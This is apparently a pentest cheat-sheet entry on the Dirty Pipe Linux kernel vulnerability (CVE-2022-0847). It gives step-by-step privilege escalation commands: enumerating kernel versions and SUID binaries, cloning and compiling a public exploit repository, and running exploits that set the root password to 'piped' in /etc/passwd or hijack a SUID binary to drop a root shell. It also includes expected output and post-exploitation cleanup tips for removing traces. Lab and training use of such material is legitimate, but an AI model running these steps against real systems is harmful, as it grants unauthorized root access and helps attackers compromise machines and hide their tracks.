### 1. Technique Name:

Dirty Pipe – Arbitrary Write to Read-Only Files (CVE-2022-0847)
### 2. Summary:

Dirty Pipe is a critical vulnerability in the Linux kernel (versions 5.8 through 5.17) that allows local unprivileged users to overwrite read-only files, even those owned by root, provided they have read access to them. Similar to Dirty COW, it allows privilege escalation by modifying sensitive files like `/etc/passwd` or hijacking SUID binaries.

The vulnerability lies in the Linux kernel’s pipe buffer handling logic, and allows for arbitrary file overwrites through specially crafted splice and write operations.
### 3. Conditions / Requirements:

- Kernel version 5.8 – 5.17 (check with `uname -r`)    
- Read access to a target file (e.g., `/etc/passwd`, SUID binaries)
- Ability to compile and execute C code
- Local access to the system
### 4. Enumeration Steps:
#### A. Check kernel version:

```bash
uname -r
# Must fall between 5.8 and 5.17
```
#### B. Confirm write permissions on target files (read access is enough):

```bash
ls -l /etc/passwd
```
#### C. Find SUID binaries (for exploit-2):

```bash
find / -perm -4000 2>/dev/null
```
### 5. Exploitation Steps:
#### A. Download and compile the exploit:

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```
#### Option 1 – Overwrite `/etc/passwd` (exploit-1):

This exploit injects a new root user with password `piped` into `/etc/passwd`.

```bash
./exploit-1
```

Output:

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell...
```

Now switch to root:

```bash
su root
# password: piped
```
#### Option 2 – Hijack SUID binary (exploit-2):

Pick a SUID binary like `/usr/bin/sudo` or `/usr/bin/passwd`, and run:

```bash
./exploit-2 /usr/bin/sudo
```

Output:

```
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
```

Confirm root access:

```bash
# id
uid=0(root) gid=0(root)
```
### 6. Post-Exploitation Tips:

- Restore original `/etc/passwd` if modified:    

```bash
mv /tmp/passwd.bak /etc/passwd
```

- Clean up dropped SUID shell if used:

```bash
rm /tmp/sh
```

- Use your access to pivot or enumerate further:

```bash
cat /root/flag.txt
```
### 7. Example Commands / Recap:

#### Kernel verification:

```bash
uname -r
# Expect something like 5.13.0-xx
```
#### PoC Repository:

[https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Dirty_Pipe